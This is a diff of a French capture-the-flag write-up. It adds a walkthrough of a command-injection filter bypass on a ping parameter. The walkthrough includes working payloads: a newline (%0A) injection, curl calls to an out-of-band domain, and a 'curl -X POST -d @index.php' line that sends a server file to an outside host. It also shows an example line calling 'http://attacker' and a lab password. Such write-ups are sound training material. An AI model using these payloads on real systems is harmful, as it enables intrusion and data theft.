@@ -429,6 +429,7 @@ PortSwigger recommande donc :
 
 - **PortSwigger – Preventing **CSRF** vulnerabilities**  
   [https://portswigger.net/web-security/csrf/preventing](https://portswigger.net/web-security/csrf/preventing)
+
   
 
 # Challenge 7 --- SQL Injection Error-Based
@@ -600,8 +601,120 @@ Mettre le mot de passe "1a2BdKT5DIx3qxQN3UaC" dans la page authentification :
 
 <img width="2494" height="416" alt="Capture d’écran 2025-12-03 à 15 06 03" src="https://github.com/user-attachments/assets/d17484bf-9001-4eb5-8f48-b070d6248042" />
 
+Le contenu de la page contents est désormais visible :
+
+<img width="2940" height="346" alt="Capture d’écran 2025-12-03 à 15 09 20" src="https://github.com/user-attachments/assets/1bae8468-e4ae-49e3-84fc-0f305d617fc7" />
 
 
+
+# Challenge 8 --- Command injection — Filter bypass
+
+## 1. Objectif du challenge
+Le challenge demande de prouver qu'on peut exécuter des commandes sur le serveur et récupérer une donnée sensible (ici le contenu d’un fichier `.passwd`). 
+L’interface expose un paramètre `ip` qui est utilisé pour un `ping`. Le but est de contourner les protections/les filtres pour exfiltrer le fichier (index.php → .passwd → mot de passe).
+
+## 2. Vulnérabilité : Command injection
+La *command injection* survient lorsque l’application passe des données contrôlées par l’utilisateur à un interpréteur de commandes (shell) sans les neutraliser correctement. 
+L’attaquant peut alors insérer des séparateurs/commandes qui seront interprétés et exécutés.
+
+### Contexte technique probable
+Le serveur exécute quelque chose du type :
+
+```bash
+# PHP-like pseudo
+$cmd = "ping -c 2 " . $_GET['ip'];
+system($cmd);
+```
+
+Si `$_GET['ip']` contient  `127.0.0.1; curl http://attacker`, alors le shell reçoit : `ping -c 2 127.0.0.1; curl http://attacker`
+
+→ exécution des 2 commandes si le shell accepte le séparateur ; 
+
+
+### Phase d'observation
+- **Tester l'entrée normale** (`ip=127.0.0.1`) pour vérifier qu'une commande est effectivement exécutée
+- Observer la réponse "Ping OK" qui confirme l'exécution côté serveur, mais la sortie est masquée.
+- Il y a donc un canal d’exécution, mais il faudra exfiltrer via un canal externe (OAST) puisque la réponse ne retourne pas le résultat des commandes.
+
+### Utilisation d'un outil OAST (Out-of-Band Application Security Testing)
+- Si la sortie est masquée, utiliser un service OAST pour détecter l'exécution
+- Services recommandés :
+  - **Burp Collaborator** (intégré à Burp Suite)
+  - **Interactsh** (outil utilisé)
+ 
+<img width="872" height="1428" alt="Capture d’écran 2025-12-03 à 16 50 56" src="https://github.com/user-attachments/assets/19501fad-589f-4aca-98ec-0b74c831f66c" />
+
+
+### Tests de séparateurs de commandes
+- Le **;** est le séparateur de commande classique en shell. Si **;** fonctionne, on peut chaîner des commandes.
+- Tester les séparateurs simples : `;`, `&&`, `|`
+<img width="2436" height="990" alt="Capture d’écran 2025-12-03 à 16 40 05" src="https://github.com/user-attachments/assets/1af7dc75-56a4-47da-8957-f1ecb8e98059" />
+
+→ **;** n’est pas bloqué au niveau de l’entrée. 
+Mais attention : même si **;** passe, la commande suivante peut échouer si d’autres caractères (espaces, mots) sont filtrés.
+
+### Tests d'exécution de commandes basiques
+- Tenter d'exécuter des commandes simples : `cat`, `ls`, `curl`
+<img width="2436" height="990" alt="Capture d’écran 2025-12-03 à 16 44 36" src="https://github.com/user-attachments/assets/738d239a-ceae-4e01-a304-08ad151d5cc4" />
+
+→ Le serveur rejette l’expression : probablement parce que les espaces, certains mots-clés, ou une forme particulière de chaîne sont filtrés (ou parce que l’entrée est passée par un parser qui rejette certaines séquences).
+
+**Conclusion :** `; cat index.php` ne passe pas directement.
+
+### Tester curl :
+- Tenter de tester 
+Payload testé : `ip=127.0.0.1;curl http://burfmgxiiuvqxzqjxaeet88lp3emf7ixn.oast.fun`
+
+<img width="2436" height="990" alt="Capture d’écran 2025-12-03 à 16 49 10" src="https://github.com/user-attachments/assets/b08027ea-8e33-40e0-98ce-4a9800c04f30" />
+
+L’idée est d’utiliser curl pour faire une requête vers notre domaine OAST et ainsi prouver exécution.
+
+→ Comme pour cat, l’espace entre curl et l’URL ou d’autres caractères sont bloqués, rendant la tentative invalide.
+
+### Recherche de contournements
+- Utiliser des ressources comme [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).
+  
+→ Trouver des séparateurs ou encodages alternatifs (ex : encodage URL, substitution, commentaires, newline, etc.).
+Beaucoup de techniques ne passent pas ; il faut isoler ce qui est effectivement autorisé par le parser serveur.
+
+### %0A
+- %0A est le caractère LINE FEED (newline). Lorsque l’input est décodé puis passé au shell, un newline équivaut à terminer la ligne, ce qui en pratique démarre une nouvelle commande.
+- Si %0A n’est pas filtré, on peut écrire une deuxième commande sur une nouvelle ligne, évitant l’espace bloqué dans la même ligne ou les artefacts du parser.
+  
+Traduction côté shell :
+```bash
+ping -c 2 127.0.0.1
+<nouvelle ligne> commande_suivante
+```
+
+### Exécution de curl après %0A
+Payload testé :
+`ip=127.0.0.1%0acurl http://burfmgxiiuvqxzqjxaeet88lp3emf7ixn.oast.fun`
+<img width="2430" height="1074" alt="Capture d’écran 2025-12-03 à 16 58 03" src="https://github.com/user-attachments/assets/cfbda0cf-ac50-4d4f-9022-06af479f3153" />
+
+Une requête HTTP apparaît dans Interactsh (ou Burp Collaborator).
+<img width="2938" height="1422" alt="Capture d’écran 2025-12-03 à 16 58 12" src="https://github.com/user-attachments/assets/94f746fb-1005-4e49-bb51-56fe89edbf82" />
+
+- Le newline a permis de commencer une commande sur une nouvelle ligne : curl http://....
+- Le serveur exécute curl, qui provoque une requête sortante visible dans l’interface OAST.
+  
+→ Exécution de commande confirmée et canal d’exfiltration disponible.
+
+### Tentative de lecture de index.php avec substitution (échec)
+`ip=127.0.0.1%0acurl http://burfmgxiiuvqxzqjxaeet88lp3emf7ixn.oast.fun/``cat index.php``
+Pas de réponse utile / aucun enregistrement avec le contenu attendu.
+- Les backticks `...` ou la substitution de commandes sont probablement filtrés ou désactivés.
+Ou bien la manière dont la commande est envoyée (par ex. via HTTP param) empêche l’interprétation de backticks.
+
+### Trouver une méthode qui évite cat et backticks : curl -X POST -d @file
+- **curl** accepte l’option `-d @file` qui fait que **curl lira le fichier localement côté serveur et enverra son contenu en POST.
+- Cela évite d’avoir à appeler cat ou faire de la substitution.
+`ip=127.0.0.1%0acurl -X POST -d @index.php http://burfmgxiiuvqxzqjxaeet88lp3emf7ixn.oast.fun`
+
+<img width="2938" height="1422" alt="Capture d’écran 2025-12-03 à 17 13 05" src="https://github.com/user-attachments/assets/7f1e2134-2fda-4786-aa16-72896311b005" />
+
+→ Aucun backtick, pas de substitution, la seule « nouveauté » est le flag -d @file qui est interprété par curl, et curl lit le fichier localement.
+→ Les espaces à l’intérieur de la commande curl -X POST -d @file sont acceptés car ils sont sur la nouvelle ligne et le parser ne les bloque pas dans ce contexte — la raison technique exacte dépend du filtre (parfois seul le paramètre GET est filtré d’une certaine façon, tandis que la ligne suivante est interprétée différemment).
 
 
 
